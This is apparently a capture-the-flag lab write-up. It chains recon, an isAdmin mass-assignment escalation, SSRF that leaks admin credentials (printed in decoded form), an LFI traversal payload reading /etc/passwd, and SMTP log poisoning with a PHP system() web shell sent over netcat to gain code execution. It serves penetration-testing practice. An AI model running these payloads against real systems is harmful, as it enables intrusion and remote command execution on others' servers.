# Recon
Start with `nmap`

```
nmap -sV -T4 -vv -O -A 10.48.188.141
...
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a9:8d:f7:d4:1d:5e:e1:b8:1d:57:20:d9:b9:d1:fc:af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPV6+VGL/iHyamzb6KCdP3NaZPRKHme75lOD0o9/sAGmI1HxA6mcLAGin/vxAVYpkXzS6tteT859RQLmmKLQR1c6BlFYCaAmpsJx/EVfn6UEOvuvbkj+H6g4VFKUqOqquyfha5XoYhattRGIMVvqwh7HoX2mcFFTk8RkibAa6dprIMqGy515xUW5rX3hb7wJmZO7hDHcecwp0hPPVkhXxAZ9YJCNfiUGqMJk3L69mjISYRyItthpZ7LGBzuaR9iZAlGnmRjkPVePZFCuHV/TAIc+9CKvB9M7vJeoCnlfxwT8PKLeWCx6GOZJtF9zyvLauvO0+qdpIuVo2R1we+bytXdJk2f1U8xS56S8z04CwtzLjmanqUZhObl6jB8xoWewKznr9rEkHViPsbUHWtBcRUo/paD2rovEhAQCv19DAbwtYZUY6ESqn1BhwdFjELEs/aVx6fclr2a87ZmAUrv56OudigTH3qXnqk5cg/2ScPIoiuwwHM2Cp0Meuc+BF5TsE=
|   256 c7:8c:44:56:5f:c4:84:b5:9c:6a:5c:ce:b4:17:ff:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIAROIlTnVU6gXemJiwjdG/atKsX+o2fMBicOsoHWGEyN5BqetuEqS+9+mb9AXgS/dHKXumHtHYXQ3ofLVNHtpY=
|   256 5b:b3:31:f6:05:f2:48:14:b2:dc:5e:de:59:82:cc:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqE1/aev3VMLhm9ke9hke6TvAka9yotiXalqfJ3ZRI+
25/tcp    open  smtp     syn-ack ttl 62 Postfix smtpd
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
110/tcp   open  pop3     syn-ack ttl 62 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL RESP-CODES CAPA TOP UIDL AUTH-RESP-CODE STLS
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
143/tcp   open  imap     syn-ack ttl 62 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more listed post-login have IMAP4rev1 LOGIN-REFERRALS ID STARTTLS Pre-login capabilities LOGINDISABLEDA0001 OK IDLE ENABLE SASL-IR LITERAL+
993/tcp   open  ssl/imap syn-ack ttl 62 Dovecot imapd (Ubuntu)
|_imap-capabilities: more listed post-login have IMAP4rev1 LOGIN-REFERRALS AUTH=PLAIN ENABLE AUTH=LOGINA0001 capabilities Pre-login OK IDLE ID SASL-IR LITERAL+
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 syn-ack ttl 62 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL(PLAIN LOGIN) USER CAPA TOP UIDL AUTH-RESP-CODE RESP-CODES
| ssl-cert: Subject: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-10-31-82.eu-west-1.compute.internal
| Issuer: commonName=ip-10-10-31-82.eu-west-1.compute.internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T16:53:34
| Not valid after:  2031-11-08T16:53:34
| MD5:   05c8:4559:9811:a54f:9c53:b3ee:f6ad:f0fd
| SHA-1: a24d:7a7f:9ac1:8045:5c5f:5b7c:721a:4e21:0599:ed7c
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIUZOpVp2fjesLBhoJHfQXOvrRFh2AwDQYJKoZIhvcNAQEL
| BQAwNDEyMDAGA1UEAwwpaXAtMTAtMTAtMzEtODIuZXUtd2VzdC0xLmNvbXB1dGUu
| aW50ZXJuYWwwHhcNMjExMTEwMTY1MzM0WhcNMzExMTA4MTY1MzM0WjA0MTIwMAYD
| VQQDDClpcC0xMC0xMC0zMS04Mi5ldS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANCGzRe8Ucyrg1ICrmylNf/G
| Dhe8gGUJsnSdBBwzEhofznOXvjGJ/P+5/ScXSNm5Bb632xtPcZ3wSq9xHq8JqZMu
| oXjoyd4U6VK6aV4xjxlwdE33DgsAHXORv9PkMi+NeYDFsJrdRznSV64mc9xhIqSk
| WdnALkBXvNZcTwy6feITP3F4YTGa5ewRNJSVutU4hBY1CfroZxRnff6kkbF0iqQc
| dSHPjK3NeAZnp4iVID8rBuV/fjjOtZ53z1u6cXmQVc2fljvD4GN3TxV4MKbazqOb
| +kEYdT5MiBEIJjQddhagbMWDYPF7McDSS/I3y4KdL1mI40Fjr6sXKOetrFvRZ+cC
| AwEAAaNDMEEwCQYDVR0TBAIwADA0BgNVHREELTArgilpcC0xMC0xMC0zMS04Mi5l
| dS13ZXN0LTEuY29tcHV0ZS5pbnRlcm5hbDANBgkqhkiG9w0BAQsFAAOCAQEArHg4
| zvCqUMzbSvusDU3d4cPDYnh7a7fAdOeVxHWo8/z/gzB8/ojJ8oYtfDV3qdKRhg0m
| pGSG3A2MZvl9u4FYj2tI8sne5HNTGRNg+3DLR/O9lFR90TH4v4piyAJrc29nFmpe
| Mq8I+JOizeSVG9qMSp6s0hDcHGAs111avS5TkEUvL0GybJIIQabOMDJ1e+Mptca+
| iV+Z+rdfirNzw87twkMxEpwTVPf3h5G0EKwE62Ih8cG1Pk/NrZCz5lN5P2b2BwHQ
| wbmbTgiA+hBmWajlHVu7EwEIsnMGrzTgSacVhHd7WsThLlMQwgNIowzUMagIA0yD
| s6SpR/+RIiQzeFiuTw==
|_-----END CERTIFICATE-----
4000/tcp  open  http     syn-ack ttl 62 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Sign In
50000/tcp open  http     syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: System Monitoring Portal
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
```

I know there are two open ports with HTTP service via `4000` and `50000`. Let's enumerate hidden directories

### Port 4000
Hidden Directories
```
ffuf -u http://10.48.188.141:4000/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
Index                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 179ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 178ms]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 173ms]
index                   [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 180ms]
signin                  [Status: 200, Size: 1295, Words: 366, Lines: 41, Duration: 179ms]
signout                 [Status: 302, Size: 29, Words: 4, Lines: 1, Duration: 179ms]
signup                  [Status: 500, Size: 1246, Words: 55, Lines: 11, Duration: 179ms]
```

Here is the page with provided credentials
<img width="1920" height="1006" alt="Screenshot_2025-12-03_01-48-15" src="https://github.com/user-attachments/assets/65998a34-acdb-4fec-b538-725292cff77f" />

After Loggin, it will look like this
<img width="1920" height="924" alt="Screenshot_2025-12-03_01-49-09" src="https://github.com/user-attachments/assets/d760faf4-d414-456e-9861-31d80f187be4" />

Let's dive into my profile
<img width="1920" height="969" alt="Screenshot_2025-12-03_01-49-44" src="https://github.com/user-attachments/assets/0277b5d0-43dc-42b6-a6b9-52c739d01a4c" />

I can clearly see that the page display the variables and also value, so I attempt to add another variable called `book` and it displays, which gives me insight whether I could modify the value `isAdmin` to true
<img width="1920" height="1017" alt="Screenshot_2025-12-03_01-49-26" src="https://github.com/user-attachments/assets/f893c7f7-f766-4bad-8c94-ddaaf24c429d" />

By inserting the variable `isAdmin` to `Activity Type` box and `Activity Name` which is true 
<img width="1920" height="961" alt="Screenshot_2025-12-03_01-58-44" src="https://github.com/user-attachments/assets/3e3d94ef-858b-4838-be44-bea7759cc049" />

Now there is a new section in the navigation bar called API and Settings let's have a look at them

#### API
<img width="1920" height="958" alt="Screenshot_2025-12-03_01-59-57" src="https://github.com/user-attachments/assets/e07633c9-8eb4-4d30-b219-16d1dadd8f59" />

#### Settings
<img width="1922" height="970" alt="Screenshot_2025-12-03_02-00-09" src="https://github.com/user-attachments/assets/f805a1ae-90a4-4451-90f7-e97d349789bc" />

This function allow user to admin to access resource exteranally or internally. My theory is to conduct SSRF attack by get the Internal API content from API with Settings
<img width="1921" height="964" alt="Screenshot_2025-12-03_02-05-14" src="https://github.com/user-attachments/assets/0d2dd193-c805-4626-9fba-5ba948110a03" />

```
echo "eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9" | base64 -d
{"secretKey":"superSecretKey123","confidentialInfo":"This is very confidential information. Handle with care."}
```
After decoding the base64 string reveals that this setting is vulnerable to SSRF attack which then I use the AdminsAPI
```
echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 -d
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}   
```
<img width="1920" height="962" alt="Screenshot_2025-12-03_02-08-25" src="https://github.com/user-attachments/assets/25f6531e-669b-44e0-82d7-a4dfcd4b9979" />

### Port 50000
Hidden Directories
```
ffuf -u http://10.48.188.141:50000/FUZZ -w /usr/share/wordlists/dirb/big.txt 2>/dev/null
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3481ms]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4499ms]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 175ms]
phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 177ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 179ms]
templates               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 176ms]
uploads                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 177ms]
```

Here is the page
<img width="1920" height="1002" alt="Screenshot_2025-12-03_02-10-05" src="https://github.com/user-attachments/assets/af853532-dac5-4a05-8a3b-4cce5ed8f3ff" />

Here is the Login portal and I use the decoded credentials above to get access in SysMon
<img width="1920" height="697" alt="Screenshot_2025-12-03_02-12-25" src="https://github.com/user-attachments/assets/6a853dd8-c6d8-4e1f-b71f-e25df7097b1a" />
<img width="1920" height="690" alt="Screenshot_2025-12-03_02-11-53" src="https://github.com/user-attachments/assets/5138998b-e148-490b-9a6d-10f312cd0e94" />

So I notice that in the page source the image is reference locally
<img width="1923" height="1001" alt="Screenshot_2025-12-03_02-31-53" src="https://github.com/user-attachments/assets/26d8ac34-2ddd-4bda-bf90-9580b2d566cf" />

Which might allow me to access other contain in the server 
<img width="1920" height="900" alt="Screenshot_2025-12-03_02-38-09" src="https://github.com/user-attachments/assets/c7b78529-952d-4d51-b2f0-9ce007f59cd9" />

I am going to use Burp Suite Intruder and the payload `/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
<img width="1601" height="905" alt="Screenshot_2025-12-03_03-04-45" src="https://github.com/user-attachments/assets/2a426718-1d79-4fd9-8afe-13333dc27945" />

Then I create the payload to view `/etc/passwd`
```
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```
It works. However, I cannot view the content of `/var/www/html` which means that I have to find another way
<img width="1920" height="927" alt="Screenshot_2025-12-03_03-06-54" src="https://github.com/user-attachments/assets/1547f462-1b1d-4884-ac97-d4901b0a3e8a" />

So may be conduct a RCE to retrieve the flag. From the output above I have two users `joshua` and `charles`, which arouse my interest in checking for mail logs since the port pop3 and smtp is open
<img width="1916" height="303" alt="Screenshot_2025-12-03_03-12-25" src="https://github.com/user-attachments/assets/c4753fcc-b5a4-4ca1-83e0-f9811f897125" />

The content in this file include :
    - Logs of incoming and outgoing emails
    - Server-side events that could give insight into how the application functions

I look for combination of LFI and SMTP vulnerability and here it goes the [article](https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/)

So prepare for the payload
```
RCPT TO:<?php system($_GET['c']); ?>
```
then connect to smtp service
```
nc 10.49.191.215 25
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
MAIL FROM:<gay@thm.com>
250 2.1.0 Ok
RCPT TO:<?php system($_GET['c']); ?>
501 5.1.3 Bad recipient address syntax
```

After successfully inject, it is time for retrieving data
<img width="1920" height="229" alt="Screenshot_2025-12-03_03-20-51" src="https://github.com/user-attachments/assets/8fee6ab8-56c8-498a-9761-ba68027514ec" />
<img width="1920" height="220" alt="Screenshot_2025-12-03_03-20-09" src="https://github.com/user-attachments/assets/749f89cf-ea9e-4902-9fa2-68a8cd829f1a" />

Happy Hacking~~!!~!
